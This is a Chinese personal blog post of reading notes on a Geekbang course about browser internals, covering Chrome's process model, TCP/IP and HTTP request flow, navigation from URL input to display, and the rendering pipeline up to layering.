<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【阅读笔记】— — 浏览器工作原理（极客时间） | 青山の博客</title><meta name="keywords" content="浏览器工作原理"><meta name="author" content="青山,lvchangjing_hit@163.com"><meta name="copyright" content="青山"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言本文是极客时间——浏览器工作原理与实践 专栏的阅读笔记，以便后续复习回顾。（侵权删） 宏观视角下的浏览器多进程浏览器时代最新的 Chrome 进程架构如下图：  这几个进程的功能：  浏览器进程。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。 渲染进程。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScr">
<meta property="og:type" content="article">
<meta property="og:title" content="【阅读笔记】— — 浏览器工作原理（极客时间）">
<meta property="og:url" content="https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/index.html">
<meta property="og:site_name" content="青山の博客">
<meta property="og:description" content="前言本文是极客时间——浏览器工作原理与实践 专栏的阅读笔记，以便后续复习回顾。（侵权删） 宏观视角下的浏览器多进程浏览器时代最新的 Chrome 进程架构如下图：  这几个进程的功能：  浏览器进程。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。 渲染进程。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScr">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/10/13/UAFPpZByEcjaWOw.jpg">
<meta property="article:published_time" content="2021-06-12T19:35:37.000Z">
<meta property="article:modified_time" content="2021-10-13T05:42:45.255Z">
<meta property="article:author" content="青山">
<meta property="article:tag" content="浏览器工作原理">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/10/13/UAFPpZByEcjaWOw.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asura1211.github.io/2021/06/12/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【阅读笔记】— — 浏览器工作原理（极客时间）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-13 13:42:45'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="青山の博客" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/06/07/Zpg5K4k9MJcLmI8.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/10/13/UAFPpZByEcjaWOw.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">青山の博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【阅读笔记】— — 浏览器工作原理（极客时间）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-12T19:35:37.000Z" title="发表于 2021-06-13 03:35:37">2021-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-13T05:42:45.255Z" title="更新于 2021-10-13 13:42:45">2021-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">阅读笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">32.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>98分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【阅读笔记】— — 浏览器工作原理（极客时间）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100033601">极客时间——浏览器工作原理与实践</a> 专栏的阅读笔记，以便后续复习回顾。（侵权删）</p>
<h1 id="宏观视角下的浏览器"><a href="#宏观视角下的浏览器" class="headerlink" title="宏观视角下的浏览器"></a>宏观视角下的浏览器</h1><h2 id="多进程浏览器时代"><a href="#多进程浏览器时代" class="headerlink" title="多进程浏览器时代"></a>多进程浏览器时代</h2><p>最新的 Chrome 进程架构如下图：</p>
<p><img src="https://i.loli.net/2021/06/13/8ydCa7AL9ZuH4qh.jpg" alt="Snipaste_2021-06-13_19-43-47.jpg"></p>
<p>这几个进程的功能：</p>
<ul>
<li><strong>浏览器进程</strong>。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li>
<li><strong>渲染进程</strong>。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li>
<li><strong>GPU 进程</strong>。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li>
<li><strong>网络进程</strong>。主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li>
<li><strong>插件进程</strong>。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li>
</ul>
<p><strong>所以打开 1 个页面至少需要 1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 1 个渲染进程，共 4 个</strong>；如果打开的页面有运行插件的话，还需要再加上 1 个插件进程。</p>
<h2 id="页面文件如何完整送达浏览器？"><a href="#页面文件如何完整送达浏览器？" class="headerlink" title="页面文件如何完整送达浏览器？"></a>页面文件如何完整送达浏览器？</h2><h3 id="IP：把数据包送达目的主机"><a href="#IP：把数据包送达目的主机" class="headerlink" title="IP：把数据包送达目的主机"></a>IP：把数据包送达目的主机</h3><p>直接见图片：</p>
<p><img src="https://i.loli.net/2021/06/13/9PEtrafCURos1Qb.jpg" alt="Snipaste_2021-06-13_19-49-45.jpg"></p>
<h3 id="UDP：把数据包送达应用程序"><a href="#UDP：把数据包送达应用程序" class="headerlink" title="UDP：把数据包送达应用程序"></a>UDP：把数据包送达应用程序</h3><p>IP 通过 IP 地址信息把数据包发送给指定的电脑，而 UDP 通过端口号把数据包分发给正确的程序</p>
<p><img src="https://i.loli.net/2021/06/13/rAfZg3J8RUFk1Vu.jpg" alt="Snipaste_2021-06-13_19-51-04.jpg"></p>
<h3 id="TCP：把数据完整地送达应用程序"><a href="#TCP：把数据完整地送达应用程序" class="headerlink" title="TCP：把数据完整地送达应用程序"></a>TCP：把数据完整地送达应用程序</h3><p>一个完整的 TCP 连接的生命周期包括了“<strong>建立连接</strong>”“<strong>传输数据</strong>”和“<strong>断开连接</strong>”三个阶段。</p>
<p><img src="https://i.loli.net/2021/06/13/shdrBIkjAyg6Vot.jpg" alt="Snipaste_2021-06-13_19-52-42.jpg"></p>
<h2 id="浏览器端发起-HTTP-请求流程"><a href="#浏览器端发起-HTTP-请求流程" class="headerlink" title="浏览器端发起 HTTP 请求流程"></a>浏览器端发起 HTTP 请求流程</h2><p>如果你在浏览器地址栏里键入极客时间网站的地址：<a target="_blank" rel="noopener" href="http://time.geekbang.org/index.html%EF%BC%8C">http://time.geekbang.org/index.html</a></p>
<h3 id="构建请求"><a href="#构建请求" class="headerlink" title="构建请求"></a>构建请求</h3><p>首先，浏览器构建<strong>请求行</strong>信息。构建好后，浏览器准备发起网络请求。</p>
<p><code>GET /index.html HTTP1.1</code></p>
<h3 id="查找缓存"><a href="#查找缓存" class="headerlink" title="查找缓存"></a>查找缓存</h3><p>在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。其中，<strong>浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术</strong>。</p>
<p>当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。（缓解服务器端压力，提升性能）</p>
<h3 id="准备-IP-地址和端口"><a href="#准备-IP-地址和端口" class="headerlink" title="准备 IP 地址和端口"></a>准备 IP 地址和端口</h3><p>浏览器使用<strong>HTTP 协议作为应用层协议</strong>，用来封装请求的文本信息；并使用<strong>TCP/IP 作传输层协议</strong>将它发到网络上。因此<strong>HTTP 的内容是通过 TCP 的传输数据阶段来实现的。</strong></p>
<p><img src="https://i.loli.net/2021/06/13/nSpi5u2DCcIXR9z.jpg" alt="Snipaste_2021-06-13_19-56-13.jpg"></p>
<p><strong>第一步浏览器会请求 DNS 返回域名对应的 IP</strong>。当然浏览器还提供了<strong>DNS 数据缓存服务</strong>，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。</p>
<p>拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。</p>
<h3 id="等待-TCP-队列"><a href="#等待-TCP-队列" class="headerlink" title="等待 TCP 队列"></a>等待 TCP 队列</h3><p>Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。</p>
<h3 id="建立-TCP-连接"><a href="#建立-TCP-连接" class="headerlink" title="建立 TCP 连接"></a>建立 TCP 连接</h3><p>TCP工作方式见上文。</p>
<h3 id="发送-HTTP-请求"><a href="#发送-HTTP-请求" class="headerlink" title="发送 HTTP 请求"></a>发送 HTTP 请求</h3><p>HTTP 中的数据正是在这个通信过程中传输的。</p>
<p><img src="https://i.loli.net/2021/06/13/j1Ys4IfaHC9wXoA.jpg" alt="Snipaste_2021-06-13_20-00-16.jpg"></p>
<p>首先浏览器会向服务器发送<strong>请求行</strong>，它包括了<strong>请求方法、请求 URI和 HTTP 版本协议</strong>。</p>
<p>请求行里最常用的请求方法是 <strong>Get/POST。</strong>在浏览器发送请求行命令之后，还要以<strong>请求头</strong>形式发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。</p>
<h2 id="服务器端处理-HTTP-请求流程"><a href="#服务器端处理-HTTP-请求流程" class="headerlink" title="服务器端处理 HTTP 请求流程"></a>服务器端处理 HTTP 请求流程</h2><h3 id="返回请求"><a href="#返回请求" class="headerlink" title="返回请求"></a>返回请求</h3><p><img src="https://i.loli.net/2021/06/13/qHVi3gnF8pmQLJE.jpg" alt="Snipaste_2021-06-13_20-02-54.jpg"></p>
<p>服务器会返回<strong>响应行</strong>，包括协议版本和状态码。且通过请求行的<strong>状态码</strong>来告诉浏览器它的处理结果。</p>
<p>服务器也会随同响应向浏览器发送<strong>响应头</strong>。响应头包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。</p>
<p>发送完响应头后，服务器就可以继续发送<strong>响应体</strong>的数据，通常，响应体就包含了 HTML 的实际内容。</p>
<h3 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h3><p>通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：<code>Connection:Keep-Alive</code> 那么 TCP 连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。<strong>保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度</strong>。</p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>还有一种情况需要了解下，比如当在浏览器中打开 geekbang.org 后，会发现最终打开的页面地址是 <a target="_blank" rel="noopener" href="https://www.geekbang.org./">https://www.geekbang.org。</a></p>
<p>此时服务器响应行返回的状态码是 301。状态 301 就是告诉浏览器，我需要重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航，这就是一个完整重定向的执行流程。</p>
<h2 id="从输入URL到页面展示，发生了什么？（经典面试题）"><a href="#从输入URL到页面展示，发生了什么？（经典面试题）" class="headerlink" title="从输入URL到页面展示，发生了什么？（经典面试题）"></a>从输入URL到页面展示，发生了什么？（经典面试题）</h2><p>“从输入 URL 到页面展示完整流程示意图”：</p>
<p><img src="https://i.loli.net/2021/06/13/4dMoq38AcIE6xzO.jpg" alt="Snipaste_2021-06-13_20-08-17.jpg"></p>
<p>从图中可以看出，<strong>整个过程需要各个进程之间的配合。</strong>这个过程可以大致描述为如下：</p>
<ul>
<li>首先，用户从浏览器进程里<strong>输入请求信息</strong>；</li>
<li>然后，网络进程<strong>发起 URL 请求</strong>；</li>
<li>服务器响应 URL 请求之后，浏览器进程就又要开始<strong>准备渲染进程</strong>了；</li>
<li>渲染进程准备好之后，需要先向渲染进程提交页面数据，我们称之为<strong>提交文档</strong>阶段；</li>
<li>渲染进程接收完文档信息之后，便开始<strong>解析页面和加载子资源</strong>，完成页面的渲染。</li>
</ul>
<h3 id="1-用户输入"><a href="#1-用户输入" class="headerlink" title="1.用户输入"></a><strong>1.用户输入</strong></h3><p>当用户在地址栏中输入一个查询关键字时，地址栏会判断输入的关键字是<strong>搜索内容</strong>，还是<strong>请求的 URL</strong>。</p>
<ul>
<li>如果是搜索内容，地址栏会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL。</li>
<li>如果判断输入内容符合 URL 规则，比如输入的是 time.geekbang.org，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL，如 <a target="_blank" rel="noopener" href="https://time.geekbang.org./">https://time.geekbang.org。</a></li>
</ul>
<p>当用户输入关键字并键入回车之后，浏览器标签页上的图标便进入了加载状态。但此时图中页面显示的<strong>依然是之前打开的页面内容</strong>，并没立即替换为极客时间的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>
<h3 id="2-URL请求过程"><a href="#2-URL请求过程" class="headerlink" title="2.URL请求过程"></a><strong>2.URL请求过程</strong></h3><p>浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。</p>
<p>首先，网络进程会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么直接进入网络请求流程。这请求前的第一步是要进行 DNS 解析，以获取请求域名的服务器 IP 地址。如果请求协议是 HTTPS，那么还需要建立 TLS 连接。</p>
<p>接下来就是利用 IP 地址和服务器建立 TCP 连接。连接建立之后，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。</p>
<p>服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并发给网络进程。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容了。</p>
<p><strong>（1）重定向</strong></p>
<p>在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求。</p>
<p><strong>在导航过程中，如果服务器响应行的状态码包含了 301、302 一类的跳转信息，浏览器会跳转到新的地址继续导航；如果响应行是 200，那么表示浏览器可以继续处理该请求</strong>。</p>
<p><strong>（2）响应数据类型处理</strong></p>
<p><strong>Content-Type 是 HTTP 头中一个非常重要的字段， 它告诉浏览器服务器返回的响应体数据是什么类型</strong>，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。</p>
<p>如果 Content-Type 字段的值被浏览器判断为<strong>下载类型，那么该请求会被提交给浏览器的下载管理器，同时该 URL 请求的导航流程就此结束</strong>。但如果是<strong>HTML，那么浏览器则会继续进行导航流程</strong>。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。</p>
<h3 id="3-准备渲染进程"><a href="#3-准备渲染进程" class="headerlink" title="3.准备渲染进程"></a><strong>3.准备渲染进程</strong></h3><p>默认情况下，Chrome 会为每个页面分配一个渲染进程。但是，也有一些例外，比如从极客时间的首页里面打开了另外一个页面——算法训练营，浏览器会让这两个页面直接运行在同一个渲染进程中。</p>
<p>Chrome 的默认策略是，每个标签对应一个渲染进程。但<strong>如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程</strong>。</p>
<p>渲染进程准备好之后，还不能立即进入文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。</p>
<h3 id="4-提交文档"><a href="#4-提交文档" class="headerlink" title="4.提交文档"></a><strong>4.提交文档</strong></h3><p>这里的“文档”是指 URL 请求的响应体数据。</p>
<ul>
<li>“提交文档”的消息是由浏览器进程发出的，渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“<strong>管道</strong>”。</li>
<li>等文档数据传输完成之后，渲染进程会返回“<strong>确认提交</strong>”的消息给浏览器进程。</li>
<li>浏览器进程在收到“确认提交”的消息后，会<strong>更新浏览器界面状态</strong>，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面。</li>
</ul>
<p>更新内容如下图所示：</p>
<p><img src="https://i.loli.net/2021/06/13/Nf2UvQTo6WeCsGi.jpg" alt="Snipaste_2021-06-13_20-22-46.jpg"></p>
<p>到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了。</p>
<h3 id="5-渲染阶段"><a href="#5-渲染阶段" class="headerlink" title="5.渲染阶段"></a><strong>5.渲染阶段</strong></h3><p>一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。</p>
<h2 id="HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）"><a href="#HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）" class="headerlink" title="HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）"></a>HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）</h2><p>按照渲染的时间顺序，流水线可分为如下几个子阶段：构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。</p>
<h3 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h3><p>为什么要构建 DOM 树呢？<strong>这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树</strong>。</p>
<p><img src="https://i.loli.net/2021/06/13/LmIKEagyHOruVZi.jpg" alt="Snipaste_2021-06-13_20-39-22.jpg"></p>
<p>从图中可以看出，构建 DOM 树的<strong>输入内容</strong>是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。</p>
<h3 id="样式计算"><a href="#样式计算" class="headerlink" title="样式计算"></a>样式计算</h3><p><strong>1. 把 CSS 转换为浏览器能够理解的结构</strong></p>
<p>CSS 样式来源主要有三种：</p>
<ul>
<li>通过 link 引用的外部 CSS 文件</li>
<li><code>&lt;style&gt;</code>标记内的 CSS</li>
<li>元素的 style 属性内嵌的 CSS</li>
</ul>
<p>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets</strong>。</p>
<p><strong>2. 转换样式表中的属性值，使其标准化</strong></p>
<p><img src="https://i.loli.net/2021/06/13/VmsIWR1Hybn7u9A.jpg" alt="Snipaste_2021-06-13_20-41-48.jpg"></p>
<p><strong>3. 计算出 DOM 树中每个节点的具体样式</strong></p>
<p><strong>涉及到 CSS 的继承规则和层叠规则。</strong></p>
<p>首先是 CSS 继承。<strong>CSS 继承就是每个 DOM 节点都包含有父节点的样式</strong>。</p>
<p><img src="https://i.loli.net/2021/06/13/YGTAELfPzvMa2Zp.jpg" alt="Snipaste_2021-06-13_20-43-10.jpg"></p>
<p>第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称“层叠样式表”正是强调了这一点</strong>。</p>
<h3 id="布局阶段"><a href="#布局阶段" class="headerlink" title="布局阶段"></a>布局阶段</h3><p>接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局。</p>
<p>Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。</p>
<p><strong>1. 创建布局树</strong></p>
<p>可能注意到 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以<strong>在显示之前，我们还要额外地构建一棵只包含可见元素布局树</strong>。</p>
<p>结合下图来看看布局树的构造过程：</p>
<p><img src="https://i.loli.net/2021/06/13/gesREVjatk6wPN4.jpg" alt="Snipaste_2021-06-13_20-45-17.jpg"></p>
<p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。为了构建布局树，浏览器大体上完成了下面这些工作：</p>
<ul>
<li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局中；</li>
<li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 body.p.span 这个元素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。</li>
</ul>
<p><strong>2. 布局计算</strong></p>
<h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树</strong>（LayerTree）。</p>
<p><strong>浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面</strong>。</p>
<p><img src="https://i.loli.net/2021/06/13/rMFSTGNwhkUxDHz.jpg" alt="Snipaste_2021-06-13_20-53-15.jpg"></p>
<p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p>
<p><strong>满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</strong></p>
<p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层。</strong>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。<strong>明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素</strong>等，都拥有层叠上下文属性。</p>
<p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层。</strong>（div限制，放不下了）出现裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。可以参考下图：</p>
<p><img src="https://i.loli.net/2021/06/13/8PVsfkMCbJwLpQF.jpg" alt="Snipaste_2021-06-13_20-55-26.jpg"></p>
